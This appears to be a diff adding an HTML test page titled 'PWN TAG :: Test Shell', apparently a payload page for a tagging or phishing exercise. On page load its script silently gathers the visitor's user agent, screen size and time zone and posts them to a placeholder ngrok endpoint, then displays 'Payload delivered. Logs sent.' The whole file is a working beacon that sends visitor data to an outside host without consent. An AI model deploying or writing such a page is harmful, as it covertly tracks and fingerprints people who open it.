@@ -1,0 +1,22 @@
+<html>
+  <head>
+    <title>PWN TAG :: Test Shell</title>
+    <script>
+      const log = {
+        userAgent: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+
+      fetch("https://YOUR_NGROK_URL/testlog", {
+        method: "POST",
+        body: JSON.stringify(log),
+        headers: { "Content-Type": "application/json" }
+      });
+    </script>
+  </head>
+  <body>
+    <h1>PWN TAG Test Activated</h1>
+    <p>Payload delivered. Logs sent.</p>
+  </body>
+</html>
